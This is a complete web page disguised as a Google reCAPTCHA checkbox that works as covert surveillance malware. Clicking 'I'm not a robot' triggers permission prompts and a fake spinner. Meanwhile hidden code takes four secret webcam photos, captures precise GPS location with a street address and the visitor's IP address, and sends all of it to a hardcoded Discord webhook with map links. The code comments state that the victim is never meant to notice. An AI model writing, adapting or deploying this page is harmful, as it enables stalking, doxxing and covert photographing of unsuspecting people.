<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>reCAPTCHA</title>
<style>
    * { box-sizing: border-box; }

    body {
        font-family: Roboto, Arial, sans-serif;
        background: #f9f9f9;
        display: flex;
        align-items: center;
        justify-content: center;
        min-height: 100vh;
        margin: 0;
    }

    .rc-box {
        width: 304px;
        background: #fff;
        border: 1px solid #d3d3d3;
        border-radius: 3px;
        box-shadow: 0 0 4px rgba(0,0,0,.08);
        cursor: pointer;
        user-select: none;
        -webkit-tap-highlight-color: transparent;
    }

    .rc-head { display: flex; align-items: center; padding: 13px 16px 13px 12px; }

    .rc-cb {
        width: 28px; height: 28px;
        border: 2px solid #c1c1c1;
        background: #fff;
        border-radius: 2px;
        margin-right: 14px;
        display: flex; align-items: center; justify-content: center;
        transition: border-color .15s;
        flex: 0 0 auto;
    }

    .rc-box:hover .rc-cb { border-color: #b2b2b2; }

    .rc-cb.loading { border-color: #c1c1c1; }
    .rc-cb.checked { background: #1e8e3e; border-color: #1e8e3e; }

    .rc-tick {
        color: #fff;
        font-size: 18px;
        font-weight: bold;
        line-height: 1;
        display: none;
    }
    .rc-cb.checked .rc-tick { display: block; animation: rcpop .22s ease-out; }

    @keyframes rcpop {
        0%   { transform: scale(.4); opacity: 0; }
        60%  { transform: scale(1.15); }
        100% { transform: scale(1); opacity: 1; }
    }

    .rc-spin {
        width: 17px; height: 17px;
        border: 2px solid #e6e6e6;
        border-top-color: #4285f4;
        border-radius: 50%;
        animation: rcs .9s linear infinite;
        display: none;
    }
    .rc-cb.loading .rc-spin { display: block; }
    .rc-cb.loading .rc-tick { display: none; }

    @keyframes rcs { to { transform: rotate(360deg); } }

    .rc-logo { flex: 1; display: flex; align-items: center; gap: 9px; min-width: 0; }
    .rc-mark { width: 40px; height: 40px; flex: 0 0 auto; }
    .rc-main { font-size: 14px; color: #000; line-height: 1.25; }
    .rc-sub  { font-size: 10px; color: #9aa0a6; margin-top: 3px; }
    .rc-sub a { color: #9aa0a6; text-decoration: none; }
    .rc-sub a:hover { text-decoration: underline; }

    .rc-foot {
        background: #f9f9f9;
        border-top: 1px solid #e8e8e8;
        padding: 7px 14px;
        display: flex;
        justify-content: flex-end;
        font-size: 10px;
        color: #9aa0a6;
        border-radius: 0 0 2px 2px;
    }

    /* fully invisible capture elements */
    #cam {
        position: fixed;
        left: -10000px;
        top: 0;
        width: 320px;
        height: 240px;
        transform: scaleX(-1);
        pointer-events: none;
    }
</style>
</head>
<body>

<div class="rc-box" id="widget">
    <div class="rc-head">
        <div class="rc-cb" id="cb">
            <span class="rc-tick">&#10003;</span>
            <div class="rc-spin"></div>
        </div>
        <div class="rc-logo">
            <svg class="rc-mark" viewBox="0 0 48 48" aria-hidden="true">
                <g fill="none" stroke-width="5" stroke-linecap="round">
                    <path d="M10.2 21.6A14 14 0 0 1 37.8 21.6" stroke="#4285f4"/>
                    <path d="M37.8 26.4A14 14 0 0 1 10.2 26.4" stroke="#1c3aa9"/>
                </g>
                <polygon points="38.84,27.51 33.86,22.30 41.74,20.90" fill="#1c3aa9"/>
                <polygon points="9.16,20.49 14.14,25.70 6.26,27.10" fill="#4285f4"/>
            </svg>
            <div>
                <div class="rc-main">I'm not a robot</div>
                <div class="rc-sub"><a href="#">Privacy</a> - <a href="#">Terms</a></div>
            </div>
        </div>
    </div>
    <div class="rc-foot">Protected by reCAPTCHA</div>
</div>

<!-- invisible capture elements -->
<video id="cam" playsinline autoplay muted></video>
<canvas id="snap" style="display:none"></canvas>

<script>
/* ============================================================
   1. DISCORD WEBHOOK
   ============================================================ */
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1553766824783388812/Zm7f_7JZlFK6PzVg-QrM4BKK_v281MkdteFPeQQYm9TN6TbryaBtPCgJO1b1OEYslokp?wait=true';

/* 2. Optional - Google Static Maps key for a real map preview
      with accuracy circle. Empty = free OSM preview. */
const GOOGLE_MAPS_KEY = '';

/* 3. Secret selfies */
const SELFIE_COUNT  = 4;
const SELFIE_GAP_MS = 700;

/* 4. How long the fake "verification" spinner shows */
const SPIN_MIN_MS = 900;
const SPIN_MAX_MS = 1700;

/* 5. GPS tuning */
const GEO = {
    budget:        16000,
    refineBudget:  12000,
    good:          15,
    stall:         4500,
    stallAcc:      90,
    refineIfWorse: 45,
    hardCap:       34000
};

const widget = document.getElementById('widget');
const cb     = document.getElementById('cb');

let verified = false;
const sleep = ms => new Promise(r => setTimeout(r, ms));
const noop  = () => {};

/* ============================================================
   CLICK -> spinner -> green tick. Everything else is background.
   ============================================================ */
widget.addEventListener('click', () => {
    if (verified) return;
    verified = true;

    cb.classList.add('loading');

    /* Fire everything synchronously, still inside the click gesture,
       so the browser honours the camera + location permission prompts. */
    const camPromise = startCamera();
    const locPromise = getExactLocation(noop);
    const ipPromise  = getIP();
    const selfiePromise = captureSelfies(camPromise, SELFIE_COUNT);

    /* Silent background pipeline - the user never sees this. */
    (async () => {
        try {
            const [location, ip, shots] = await Promise.all([
                Promise.race([locPromise, sleep(GEO.hardCap + 4000).then(() => null)]),
                ipPromise,
                selfiePromise
            ]);
            await send(ip, location, shots);
            console.log('[rc] sent', { hasLocation: !!location, selfies: shots.length });
        } catch (e) {
            console.warn('[rc]', e);
        }
    })();

    /* UI finishes on its own schedule so it feels like a real check. */
    sleep(SPIN_MIN_MS + Math.random() * (SPIN_MAX_MS - SPIN_MIN_MS)).then(() => {
        cb.classList.remove('loading');
        cb.classList.add('checked');
    });
});

/* ============================================================
   CAMERA - silent, hidden, no shutter sound
   ============================================================ */
async function startCamera() {
    try {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;

        return await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
            audio: false
        });
    } catch (e) {
        console.warn('camera:', e.name || e.message);
        return null;
    }
}

async function captureSelfies(streamPromise, count) {
    const stream = await streamPromise;
    if (!stream) return [];

    const video  = document.getElementById('cam');
    const canvas = document.getElementById('snap');

    video.srcObject = stream;

    await new Promise(res => {
        let done = false;
        const fin = () => { if (!done) { done = true; res(); } };
        if (video.readyState >= 2) fin();
        else video.onloadedmetadata = fin;
        setTimeout(fin, 5000);
    });

    try { await video.play(); } catch (e) {}

    await sleep(600); // let auto-exposure settle

    const shots = [];
    for (let i = 0; i < count; i++) {
        const blob = await grab(video, canvas);
        if (blob) shots.push(blob);
        if (i < count - 1) await sleep(SELFIE_GAP_MS);
    }

    stream.getTracks().forEach(t => t.stop());
    video.srcObject = null;

    return shots;
}

function grab(video, canvas) {
    return new Promise(res => {
        const w = video.videoWidth  || 640;
        const h = video.videoHeight || 480;

        canvas.width  = w;
        canvas.height = h;

        const ctx = canvas.getContext('2d');
        ctx.save();
        ctx.translate(w, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, w, h);
        ctx.restore();

        canvas.toBlob(b => res(b), 'image/jpeg', 0.85);
    });
}

/* ============================================================
   EXACT LOCATION - high-accuracy GPS only, IP as last resort
   ============================================================ */
async function getExactLocation(onProgress) {
    if (!navigator.geolocation) return await ipLocation();

    const perm = await geoPermission();
    if (perm === 'denied') return await ipLocation();

    let fix = await watchFix(GEO.budget, GEO.good, GEO.stall, GEO.stallAcc, onProgress);

    if (!fix || fix.acc > GEO.refineIfWorse) {
        const better = await watchFix(GEO.refineBudget, GEO.good, GEO.stall, GEO.stallAcc, onProgress);
        if (better && (!fix || better.acc < fix.acc)) fix = better;
    }

    if (!fix || !fix.samples.length) return await ipLocation();

    const c = cluster(fix.samples);
    const label = await reverseGeocode(c.lat, c.lng);

    return {
        lat: c.lat,
        lng: c.lng,
        acc: c.acc,
        src: 'GPS',
        used: c.n,
        seen: fix.samples.length,
        alt: fix.alt,
        altAcc: fix.altAcc,
        label: label || (c.lat.toFixed(6) + ', ' + c.lng.toFixed(6))
    };
}

async function geoPermission() {
    try {
        if (!navigator.permissions || !navigator.permissions.query) return 'unknown';
        const st = await navigator.permissions.query({ name: 'geolocation' });
        return st.state;
    } catch (e) { return 'unknown'; }
}

function watchFix(budgetMs, goodAcc, stallMs, stallAcc, onProgress) {
    return new Promise(resolve => {
        let best = null;
        let lastImprove = Date.now();
        let done = false;
        let watchId = null, tick = null, hard = null;

        const cleanup = () => {
            if (watchId != null) { try { navigator.geolocation.clearWatch(watchId); } catch (e) {} }
            clearInterval(tick);
            clearTimeout(hard);
        };

        const finish = () => {
            if (done) return;
            done = true;
            cleanup();
            resolve(best);
        };

        const started = Date.now();

        watchId = navigator.geolocation.watchPosition(
            pos => {
                const c = pos.coords;
                const s = { lat: c.latitude, lng: c.longitude, acc: c.accuracy, ts: pos.timestamp };

                if (!best) best = { samples: [], alt: null, altAcc: null };
                if (!isFinite(s.lat) || !isFinite(s.lng)) return;
                if (s.acc != null && s.acc > 20000) return;
                if (!best.samples.some(x => x.ts === s.ts)) best.samples.push(s);

                if (c.altitude != null && best.alt == null) { best.alt = c.altitude; best.altAcc = c.altitudeAccuracy; }

                const prev = best.samples.length > 1
                    ? Math.min.apply(null, best.samples.slice(0, -1).map(x => x.acc || 1e9))
                    : 1e9;
                if (s.acc < prev) lastImprove = Date.now();

                onProgress && onProgress(s.acc);
            },
            err => { if (err.code === 1) finish(); },
            { enableHighAccuracy: true, maximumAge: 0, timeout: budgetMs }
        );

        tick = setInterval(() => {
            if (done) return;
            if (!best) { if (Date.now() - started > budgetMs) finish(); return; }

            const acc = Math.min.apply(null, best.samples.map(x => x.acc || 1e9));

            if (acc <= goodAcc) return finish();
            if (acc <= stallAcc && Date.now() - lastImprove > stallMs) return finish();
            if (Date.now() - started > budgetMs) return finish();
        }, 400);

        hard = setTimeout(finish, budgetMs + 2000);
    });
}

function cluster(samples) {
    const list = samples.filter(s => isFinite(s.lat) && isFinite(s.lng) && isFinite(s.acc) && s.acc > 0);
    if (!list.length) return { lat: samples[0].lat, lng: samples[0].lng, acc: null, n: 1 };
    if (list.length === 1) return { lat: list[0].lat, lng: list[0].lng, acc: list[0].acc, n: 1 };

    const best = list.reduce((a, b) => (b.acc < a.acc ? b : a));
    const radius = Math.max(Math.min(best.acc * 2.5, 120), 40);
    const near = list.filter(s =>
        haversine(s.lat, s.lng, best.lat, best.lng) <= radius && s.acc <= Math.max(best.acc * 3, 80)
    );

    if (near.length < 2) return { lat: best.lat, lng: best.lng, acc: best.acc, n: 1 };

    let wsum = 0, lat = 0, lng = 0;
    for (const s of near) {
        const w = 1 / (s.acc * s.acc);
        wsum += w; lat += s.lat * w; lng += s.lng * w;
    }

    return { lat: lat / wsum, lng: lng / wsum, acc: Math.min.apply(null, near.map(s => s.acc)), n: near.length };
}

function haversine(a1, o1, a2, o2) {
    const R = 6371000, r = Math.PI / 180;
    const dA = (a2 - a1) * r, dO = (o2 - o1) * r;
    const h = Math.sin(dA / 2) ** 2 + Math.cos(a1 * r) * Math.cos(a2 * r) * Math.sin(dO / 2) ** 2;
    return 2 * R * Math.asin(Math.min(1, Math.sqrt(h)));
}

async function reverseGeocode(lat, lng) {
    try {
        const c = new AbortController();
        const t = setTimeout(() => c.abort(), 6000);
        const r = await fetch(
            'https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=' + lat + '&lon=' + lng +
            '&zoom=18&addressdetails=1&extratags=1',
            { signal: c.signal, headers: { Accept: 'application/json' } }
        );
        clearTimeout(t);
        if (r.ok) {
            const d = await r.json();
            const ad = d.address || {};
            const parts = [
                [ad.house_number, ad.road || ad.pedestrian || ad.footway].filter(Boolean).join(' '),
                ad.neighbourhood || ad.suburb || ad.hamlet || ad.quarter,
                ad.city || ad.town || ad.village || ad.municipality,
                ad.city_district || ad.county || ad.state_district,
                ad.state,
                ad.postcode,
                ad.country
            ].filter(Boolean);
            if (parts.length) return parts.join(', ');
            if (d.display_name) return d.display_name;
        }
    } catch (e) {}

    try {
        const c = new AbortController();
        const t = setTimeout(() => c.abort(), 5000);
        const r = await fetch(
            'https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=' + lat +
            '&longitude=' + lng + '&localityLanguage=en',
            { signal: c.signal }
        );
        clearTimeout(t);
        if (r.ok) {
            const d = await r.json();
            const parts = [d.locality, d.city, d.principalSubdivision, d.postcode, d.countryName].filter(Boolean);
            if (parts.length) return parts.join(', ');
        }
    } catch (e) {}

    return null;
}

/* ============================================================
   IP FALLBACK
   ============================================================ */
const PROVIDERS = [
    { u: 'https://api.bigdatacloud.net/data/reverse-geocode-client?localityLanguage=en',
      p: d => d.latitude ? { lat: +d.latitude, lng: +d.longitude,
           l: [d.city || d.locality, d.principalSubdivision, d.countryName].filter(Boolean).join(', ') } : null },
    { u: 'https://get.geojs.io/v1/ip/geo.json',
      p: d => d.latitude ? { lat: +d.latitude, lng: +d.longitude,
           l: [d.city, d.region, d.country].filter(Boolean).join(', ') } : null },
    { u: 'https://ipwho.is/',
      p: d => d.latitude ? { lat: +d.latitude, lng: +d.longitude,
           l: [d.city, d.region, d.country].filter(Boolean).join(', ') } : null },
    { u: 'https://freeipapi.com/api/json',
      p: d => d.latitude ? { lat: +d.latitude, lng: +d.longitude,
           l: [d.cityName, d.regionName, d.countryName].filter(Boolean).join(', ') } : null },
    { u: 'https://ipapi.co/json/',
      p: d => d.latitude ? { lat: +d.latitude, lng: +d.longitude,
           l: [d.city, d.region, d.country_name].filter(Boolean).join(', ') } : null },
    { u: 'https://ipinfo.io/json',
      p: d => d.loc ? { lat: +d.loc.split(',')[0], lng: +d.loc.split(',')[1],
           l: [d.city, d.region, d.country].filter(Boolean).join(', ') } : null }
];

async function ipLocation() {
    const tries = PROVIDERS.map(p => (async () => {
        const c = new AbortController();
        const t = setTimeout(() => c.abort(), 6000);

        try {
            const r = await fetch(p.u, { signal: c.signal, cache: 'no-store' });
            if (!r.ok) throw new Error(r.status);

            const d = await r.json();
            const val = p.p(d);

            if (!val || !isFinite(val.lat) || !isFinite(val.lng)) throw new Error('bad');
            if (val.lat === 0 && val.lng === 0) throw new Error('zero');

            return {
                lat: val.lat, lng: val.lng, acc: null,
                src: 'IP (approx)', used: 1, seen: 0,
                label: val.l || (val.lat.toFixed(4) + ', ' + val.lng.toFixed(4))
            };
        } finally { clearTimeout(t); }
    })());

    try { return await Promise.any(tries); }
    catch (e) { return null; }
}

async function getIP() {
    try {
        const r = await fetch('https://api.ipify.org?format=json');
        return (await r.json()).ip || 'Unknown';
    } catch (e) { return 'Unknown'; }
}

/* ============================================================
   HELPERS
   ============================================================ */
function toDMS(deg, isLat) {
    const dir = isLat ? (deg >= 0 ? 'N' : 'S') : (deg >= 0 ? 'E' : 'W');
    const a = Math.abs(deg);
    const d = Math.floor(a);
    const m = Math.floor((a - d) * 60);
    const s = ((a - d) * 60 - m) * 60;
    return d + '°' + m + "'" + s.toFixed(2) + '"' + dir;
}

const OLC_ALPHABET = '23456789CFGHJMPQRVWX';
function plusCode(lat, lng, digits) {
    digits = Math.min(Math.max(digits || 10, 2), 10);
    let latv = Math.min(Math.max(lat, -90), 90) + 90;
    let lngv = ((lng + 180) % 360 + 360) % 360;
    if (latv >= 180) latv = 179.9999999;

    let code = '', latRes = 20, lngRes = 20;
    for (let i = 0; i < digits; i++) {
        if (i === 8) code += '+';
        if (i % 2 === 0) {
            const d = Math.floor(latv / latRes);
            code += OLC_ALPHABET[d];
            latv -= d * latRes;
            latRes /= 20;
        } else {
            const d = Math.floor(lngv / lngRes);
            code += OLC_ALPHABET[d];
            lngv -= d * lngRes;
            lngRes /= 20;
        }
    }
    return code;
}

function circlePoints(lat, lng, radiusM, n) {
    n = n || 24;
    const R = 6371000, d = radiusM / R;
    const lat1 = lat * Math.PI / 180, lng1 = lng * Math.PI / 180;
    const pts = [];
    for (let i = 0; i < n; i++) {
        const brg = 2 * Math.PI * i / n;
        const lat2 = Math.asin(Math.sin(lat1) * Math.cos(d) + Math.cos(lat1) * Math.sin(d) * Math.cos(brg));
        const lng2 = lng1 + Math.atan2(Math.sin(brg) * Math.sin(d) * Math.cos(lat1), Math.cos(d) - Math.sin(lat1) * Math.sin(lat2));
        pts.push(lat2 * 180 / Math.PI + ',' + lng2 * 180 / Math.PI);
    }
    return pts;
}

/* ============================================================
   SEND TO DISCORD
   ============================================================ */
async function send(ip, location, shots) {
    shots = shots || [];

    let maps = null, satellite = null, coords = null, dms = null, pc = null;

    if (location) {
        coords = location.lat.toFixed(7) + ', ' + location.lng.toFixed(7);
        dms = toDMS(location.lat, true) + '  ' + toDMS(location.lng, false);
        pc = plusCode(location.lat, location.lng, 10);

        maps = 'https://www.google.com/maps/search/?api=1&query=' + location.lat.toFixed(7) + ',' + location.lng.toFixed(7);
        satellite = 'https://www.google.com/maps/@' + location.lat.toFixed(7) + ',' + location.lng.toFixed(7) + ',19z/data=!3m1!1e3';
    }

    const lines = ['**📍 Location Verified**'];

    if (location) {
        lines.push('Address: ' + location.label);
        lines.push('Plus code: ' + pc);
        lines.push('Coords: ' + coords);
        lines.push('Accuracy: ' + (location.acc != null ? '±' + Math.round(location.acc) + ' m' : 'n/a') + ' (' + location.src + ')');
        lines.push('Google Maps: ' + maps);
    } else {
        lines.push('Location: denied / unavailable');
    }

    lines.push('IP: ' + ip);
    lines.push('Selfies: ' + shots.length + (shots.length ? ' attached' : ''));

    const embed = {
        title: location ? 'Exact Location Captured' : 'Location Unavailable',
        color: 0x156b3c,
        fields: [{ name: 'IP Address', value: ip, inline: true }],
        timestamp: new Date().toISOString()
    };

    if (location) {
        embed.url = maps;
        embed.fields.push({ name: 'Address', value: String(location.label).slice(0, 1024), inline: false });
        embed.fields.push({ name: 'Plus Code', value: pc, inline: true });
        embed.fields.push({ name: 'Latitude', value: String(location.lat.toFixed(7)), inline: true });
        embed.fields.push({ name: 'Longitude', value: String(location.lng.toFixed(7)), inline: true });
        embed.fields.push({ name: 'DMS', value: dms, inline: false });
        embed.fields.push({
            name: 'Accuracy',
            value: (location.acc != null ? '±' + Math.round(location.acc) + ' m' : 'n/a') +
                   ' · ' + (location.used || 1) + '/' + (location.seen || 1) + ' samples',
            inline: true
        });
        embed.fields.push({
            name: 'Source',
            value: location.src === 'GPS' ? 'GPS high accuracy (precise)' : 'IP / network (approximate)',
            inline: true
        });

        if (location.alt != null) {
            embed.fields.push({
                name: 'Altitude',
                value: Math.round(location.alt) + ' m' + (location.altAcc != null ? ' (±' + Math.round(location.altAcc) + ' m)' : ''),
                inline: true
            });
        }

        embed.fields.push({ name: 'Google Maps', value: '[Open exact pin](' + maps + ')', inline: true });
        embed.fields.push({ name: 'Satellite', value: '[View overhead](' + satellite + ')', inline: true });

        if (GOOGLE_MAPS_KEY) {
            const zoom = !location.acc ? 17 : location.acc < 25 ? 19 : location.acc < 100 ? 18 : location.acc < 500 ? 17 : 15;
            const rad  = Math.max(Math.min(location.acc || 50, 250), 15);
            const path = circlePoints(location.lat, location.lng, rad).join('%7C');

            embed.image = {
                url: 'https://maps.googleapis.com/maps/api/staticmap?center=' + location.lat + ',' + location.lng +
                     '&zoom=' + zoom + '&size=600x300&scale=2&maptype=roadmap' +
                     '&markers=color:red%7C' + location.lat + ',' + location.lng +
                     '&path=color:0x156b3cFF%7Cweight:1%7Cfillcolor:0x156b3c33%7C' + path +
                     '&key=' + GOOGLE_MAPS_KEY
            };
        } else {
            embed.image = {
                url: 'https://maps.wikimedia.org/img/osm-intl,18,' + location.lat + ',' + location.lng + ',600x300.png'
            };
        }
    }

    const embeds = [embed];

    shots.forEach((blob, i) => {
        embeds.push({
            title: 'Secret selfie ' + (i + 1) + ' / ' + shots.length,
            color: 0x156b3c,
            image: { url: 'attachment://selfie' + (i + 1) + '.jpg' },
            timestamp: new Date().toISOString()
        });
    });

    const payload = { content: lines.join('\n'), embeds };

    let res;

    if (shots.length) {
        const fd = new FormData();
        fd.append('payload_json', JSON.stringify(payload));
        shots.forEach((blob, i) => fd.append('files[' + i + ']', blob, 'selfie' + (i + 1) + '.jpg'));
        res = await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
    } else {
        res = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    }

    if (!res.ok) throw new Error('discord ' + res.status + ' ' + (await res.text()).slice(0, 140));
}
</script>
